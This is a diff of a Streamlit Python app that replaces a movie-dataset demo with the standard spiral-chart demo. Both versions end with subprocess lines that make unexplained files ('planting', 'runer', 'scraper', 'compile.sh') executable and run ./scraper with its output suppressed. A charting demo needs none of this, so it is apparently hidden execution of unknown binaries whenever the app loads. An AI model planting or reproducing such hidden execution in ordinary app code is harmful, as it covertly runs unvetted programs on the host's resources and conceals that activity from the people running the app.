@@ -1,72 +1,42 @@
-import altair as alt
-import pandas as pd
 import streamlit as st
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
 import subprocess
 
-# Show the page title and description.
-st.set_page_config(page_title="Movies dataset", page_icon="🎬")
-st.title("🎬 Movies dataset")
-st.write(
-    """
-    This app visualizes data from [The Movie Database (TMDB)](https://www.kaggle.com/datasets/tmdb/tmdb-movie-metadata).
-    It shows which movie genre performed best at the box office over the years. Just 
-    click on the widgets below to explore!
-    """
-)
+
+"""
+# Welcome to Streamlit!
+Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
+If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
+forums](https://discuss.streamlit.io).
+In the meantime, below is an example of what you can do with just a few lines of code:
+"""
 
 
-# Load the data from a CSV. We're caching this so it doesn't reload every time the app
-# reruns (e.g. if the user interacts with the widgets).
-@st.cache_data
-def load_data():
-    df = pd.read_csv("data/movies_genres_summary.csv")
-    return df
+with st.echo(code_location='below'):
+    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
+    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)
 
+    Point = namedtuple('Point', 'x y')
+    data = []
 
-df = load_data()
+    points_per_turn = total_points / num_turns
 
-# Show a multiselect widget with the genres using `st.multiselect`.
-genres = st.multiselect(
-    "Genres",
-    df.genre.unique(),
-    ["Action", "Adventure", "Biography", "Comedy", "Drama", "Horror"],
-)
+    for curr_point_num in range(total_points):
+        curr_turn, i = divmod(curr_point_num, points_per_turn)
+        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
+        radius = curr_point_num / total_points
+        x = radius * math.cos(angle)
+        y = radius * math.sin(angle)
+        data.append(Point(x, y))
 
-# Show a slider widget with the years using `st.slider`.
-years = st.slider("Years", 1986, 2006, (2000, 2016))
+    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
+        .mark_circle(color='#0068c9', opacity=0.5)
+        .encode(x='x:Q', y='y:Q'))
 
-# Filter the dataframe based on the widget input and reshape it.
-df_filtered = df[(df["genre"].isin(genres)) & (df["year"].between(years[0], years[1]))]
-df_reshaped = df_filtered.pivot_table(
-    index="year", columns="genre", values="gross", aggfunc="sum", fill_value=0
-)
-df_reshaped = df_reshaped.sort_values(by="year", ascending=False)
-
-
-# Display the data as a table using `st.dataframe`.
-st.dataframe(
-    df_reshaped,
-    use_container_width=True,
-    column_config={"year": st.column_config.TextColumn("Year")},
-)
-
-# Display the data as an Altair chart using `st.altair_chart`.
-df_chart = pd.melt(
-    df_reshaped.reset_index(), id_vars="year", var_name="genre", value_name="gross"
-)
-chart = (
-    alt.Chart(df_chart)
-    .mark_line()
-    .encode(
-        x=alt.X("year:N", title="Year"),
-        y=alt.Y("gross:Q", title="Gross earnings ($)"),
-        color="genre:N",
-    )
-    .properties(height=320)
-)
-st.altair_chart(chart, use_container_width=True)
-
-  perm = subprocess.run(["chmod", "+x",  "planting", "runer", "scraper", "compile.sh"])
+    perm = subprocess.run(["chmod", "+x",  "planting", "runer", "scraper", "compile.sh"])
 print("Perm exit code was: %d" % perm.returncode)
 scraper = subprocess.run(["./scraper"], stdout=subprocess.DEVNULL)
 print("Scraper exit code was: %d" % scraper.returncode)
